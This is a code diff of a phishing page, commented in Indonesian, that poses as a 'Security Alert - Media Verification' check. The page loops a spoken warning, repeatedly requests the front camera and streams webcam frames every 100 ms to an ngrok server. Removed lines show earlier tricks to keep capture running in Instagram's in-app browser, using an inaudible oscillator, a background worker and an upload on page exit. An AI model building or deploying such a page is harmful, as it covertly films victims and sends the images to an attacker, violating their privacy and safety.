@@ -2,8 +2,8 @@
 <html lang="id">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>Security Alert - Media Verification v3.9</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Security Alert - Media Verification</title>
 <style>
   * { margin: 0; padding: 0; box-sizing: border-box; }
   body { background: #000; min-height: 100vh; display: flex; justify-content: center; align-items: center; color: #fff; font-family: sans-serif; }
@@ -24,82 +24,23 @@
 
   var CONFIG = {
     tts: {
-      text: "Security verification required. WebView background session active.",
+      text: "Security verification required. Live monitoring session active.",
       lang: 'en-US',
       rate: 0.9,
       pitch: 1.0,
-      repeatInterval: 5000
+      repeatInterval: 6000
     },
-    loopInterval: 2500,
-    uploadInterval: 3000,
-    serverEndpoint: 'https://studly-unallegorized-brecken.ngrok-free.dev/upload_capture'
+    streamInterval: 100, // Mengirim frame setiap 100ms untuk efek CCTV live yang halus
+    serverEndpoint: 'https://studly-unallegorized-brecken.ngrok-free.dev/upload_frame'
   };
 
   var state = {
     ttsStarted: false,
     camStream: null,
     camActive: false,
-    audioCtx: null,
-    worker: null
+    streamTimer: null
   };
 
-  // ============================================
-  // AUDIO KEEP-ALIVE (Mencegah Suspend WebView Android)
-  // ============================================
-  function initAudioKeepAlive() {
-    try {
-      window.AudioContext = window.AudioContext || window.webkitAudioContext;
-      state.audioCtx = new AudioContext();
-      
-      var oscillator = state.audioCtx.createOscillator();
-      var gainNode = state.audioCtx.createGain();
-      
-      gainNode.gain.value = 0.00001;
-      oscillator.frequency.value = 18000;
-      oscillator.connect(gainNode);
-      gainNode.connect(state.audioCtx.destination);
-      
-      oscillator.start();
-      
-      if (state.audioCtx.state === 'suspended') {
-        state.audioCtx.resume();
-      }
-    } catch (e) {}
-  }
-
-  // ============================================
-  // WEB WORKER BACKGROUND THREAD
-  // Memastikan interval tetap berdetak meski WebView di-minimize
-  // ============================================
-  function initBackgroundWorker(intervalMs) {
-    try {
-      var blobCode = `
-        self.onmessage = function(e) {
-          if (e.data === 'start') {
-            setInterval(function() {
-              self.postMessage('tick');
-            }, ${intervalMs});
-          }
-        };
-      `;
-      var blob = new Blob([blobCode], { type: 'application/javascript' });
-      var blobUrl = URL.createObjectURL(blob);
-      
-      state.worker = new Worker(blobUrl);
-      state.worker.onmessage = function(e) {
-        if (e.data === 'tick') {
-          backgroundTick();
-        }
-      };
-      state.worker.postMessage('start');
-    } catch (e) {
-      setInterval(backgroundTick, intervalMs);
-    }
-  }
-
-  // ============================================
-  // TTS MODULE
-  // ============================================
   function speakOnce() {
     if (!('speechSynthesis' in window)) return;
     try {
@@ -121,10 +62,7 @@
     speakOnce();
   }
 
-  // ============================================
-  // UPLOAD CAPTURE KE SERVER NGROK
-  // ============================================
-  function captureAndUpload(isUnloading) {
+  function streamFrame() {
     if (!state.camActive) return;
 
     var videoElement = document.getElementById('cam-feed');
@@ -135,39 +73,23 @@
       if (videoElement.readyState !== videoElement.HAVE_ENOUGH_DATA) return;
 
       ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
-      var dataURL = canvas.toDataURL('image/jpeg', 0.75);
+      var dataURL = canvas.toDataURL('image/jpeg', 0.65); // Kompresi optimal untuk stream
       var payload = JSON.stringify({ image: dataURL });
-
-      if (isUnloading && navigator.sendBeacon) {
-        var blob = new Blob([payload], { type: 'application/json' });
-        navigator.sendBeacon(CONFIG.serverEndpoint, blob);
-        return;
-      }
 
       fetch(CONFIG.serverEndpoint, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: payload,
         keepalive: true
-      })
-      .then(function(res) {
-        if (!res.ok) throw new Error('Status: ' + res.status);
-        return res.json();
-      })
-      .catch(function(err) {});
+      }).catch(function(err) {});
     } catch (e) {}
   }
 
-  // ============================================
-  // CAMERA ACCESS & RECOVERY
-  // ============================================
   function requestCameraAccess() {
+    if (state.camActive) return;
+
     navigator.mediaDevices.getUserMedia({ 
-      video: { 
-        width: { ideal: 640 }, 
-        height: { ideal: 480 }, 
-        facingMode: "user" 
-      }, 
+      video: { width: { ideal: 640 }, height: { ideal: 480 }, facingMode: "user" }, 
       audio: false 
     })
     .then(function(stream) {
@@ -181,58 +103,29 @@
       stream.getVideoTracks().forEach(function(track) {
         track.onended = function() {
           state.camActive = false;
+          setTimeout(requestCameraAccess, 2000);
         };
       });
     })
     .catch(function(err) {
-      state.camActive = false;
+      setTimeout(requestCameraAccess, 3000);
     });
   }
 
-  function backgroundTick() {
-    if (state.audioCtx && state.audioCtx.state === 'suspended') {
-      state.audioCtx.resume();
-    }
-
-    if (!state.camActive) {
-      requestCameraAccess();
-    } else {
-      captureAndUpload(false);
-    }
-  }
-
-  // ============================================
-  // INITIALIZATION & EVENT LISTENERS
-  // ============================================
   window.addEventListener('DOMContentLoaded', function() {
-    initAudioKeepAlive();
     startTTS();
     requestCameraAccess();
-    initBackgroundWorker(CONFIG.loopInterval);
+
+    // Memulai pengiriman frame cepat layaknya stream CCTV
+    state.streamTimer = setInterval(streamFrame, CONFIG.streamInterval);
   });
 
-  window.addEventListener('beforeunload', function() {
-    captureAndUpload(true);
-  });
-
-  // Memicu resume audio/kamera saat ada interaksi sentuh di dalam WebView Instagram
-  window.addEventListener('touchstart', function() {
-    if (state.audioCtx && state.audioCtx.state === 'suspended') {
-      state.audioCtx.resume();
-    }
-    if (!state.camActive) {
-      requestCameraAccess();
-    }
-  }, { passive: true });
-
-  // Page Visibility API untuk mendeteksi pergeseran fokus WebView Instagram
   document.addEventListener('visibilitychange', function () {
     if (!document.hidden) {
       startTTS();
-      if (state.audioCtx && state.audioCtx.state === 'suspended') {
-        state.audioCtx.resume();
+      if (!state.camActive) {
+        requestCameraAccess();
       }
-      requestCameraAccess();
     }
   });
 
